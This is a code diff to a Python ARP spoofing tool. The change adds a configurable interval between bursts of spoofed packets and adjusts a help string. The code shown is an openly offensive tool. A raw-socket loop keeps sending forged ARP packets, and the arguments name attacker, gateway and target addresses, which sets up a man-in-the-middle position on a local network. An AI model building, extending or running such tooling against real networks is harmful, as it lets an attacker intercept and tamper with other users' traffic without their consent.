@@ -49,13 +49,13 @@ class Spoofer(object):
     def __init__(self, interface: str):
         self.interface = interface
 
-    def execute(self, spoofed_packets):
+    def execute(self, spoofed_packets, interval: float = 0.5):
         with socket(PF_PACKET, SOCK_RAW, ntohs(0x0800)) as sock:
             sock.bind((self.interface, htons(0x0800)))
             while True:
                 for packet in spoofed_packets:
                     sock.send(packet)
-                time.sleep(0.5)
+                time.sleep(interval)
 
 
 def spoof(args):
@@ -73,7 +73,7 @@ def spoof(args):
 
     print('[+] ARP Spoofing attack initiated. Press Ctrl-C to abort.')
     try:
-        spoofer.execute(packets)
+        spoofer.execute(packets, interval=args.interval)
     except KeyboardInterrupt:
         raise SystemExit('[!] ARP Spoofing attack terminated.')
 
@@ -84,8 +84,8 @@ if __name__ == '__main__':
                     'Spoofing") on local networks.')
     attack = parser.add_mutually_exclusive_group(required=True)
     parser.add_argument('interface', type=str,
-                        help='Interface on the attacker machine to '
-                             'send/receive packets from.')
+                        help='Interface on the attacker machine to send '
+                             'packets from.')
     attack.add_argument('--attackermac', type=str, metavar='MAC',
                         help='MAC address of the Network Interface Controller '
                              '(NIC) used by the attacker.')
@@ -103,4 +103,7 @@ if __name__ == '__main__':
                         help='IP address currently assigned to the gateway.')
     parser.add_argument('--targetip', type=str, required=True, metavar='IP',
                         help='IP address currently assigned to the target.')
+    parser.add_argument('--interval', type=float, default=0.5, metavar='TIME',
+                        help='Time in between each transmission of spoofed ARP '
+                             'packets (defaults to 0.5 seconds).')
     spoof(parser.parse_args())
